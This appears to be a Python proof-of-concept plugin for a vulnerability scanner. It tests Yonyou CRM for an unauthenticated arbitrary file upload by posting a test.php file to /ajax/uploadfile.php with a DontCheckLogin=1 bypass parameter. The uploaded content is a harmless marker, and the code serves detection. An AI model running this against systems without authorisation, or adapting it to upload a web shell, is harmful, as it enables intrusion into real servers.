import requests
from xing.core.BasePlugin import BasePlugin
from xing.core import PluginType, SchemeType

class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.POC
        self.vul_name = "用友CRM任意文件上传"
        self.app_name = '用友CRM'
        self.scheme = [SchemeType.HTTPS, SchemeType.HTTP]

    def verify(self, target):
        path = "/ajax/uploadfile.php?DontCheckLogin=1&vname=file"
        url = target + path

        headers = {
            "Content-Type": "multipart/form-data; boundary=---------------------------vvv3wdayqv3yppdxvn3w"
        }
        body = (
            "-----------------------------vvv3wdayqv3yppdxvn3w\r\n"
            "Content-Disposition: form-data; name=\"file\"; filename=\"test.php\"\r\n"
            "Content-Type: application/octet-stream\r\n"
            "\r\n"
            "wersqqmlumloqa\r\n"
            "-----------------------------vvv3wdayqv3yppdxvn3w\r\n"
            "Content-Disposition: form-data; name=\"upload\"\r\n"
            "\r\n"
            "upload\r\n"
            "-----------------------------vvv3wdayqv3yppdxvn3w--"
        )

        # 发送文件上传请求
        try:
            conn = requests.post(url, headers=headers, data=body)
            content = conn.content

            # 检查上传请求的响应
            if conn.status_code == 200 and b"files" in content:
                self.logger.success("发现漏洞, 用友CRM任意文件上传: {}".format(url))
                return url
            else:
                self.logger.debug("未发现漏洞")

        except Exception as e:
            self.logger.error("请求失败: {}".format(e))

        return None
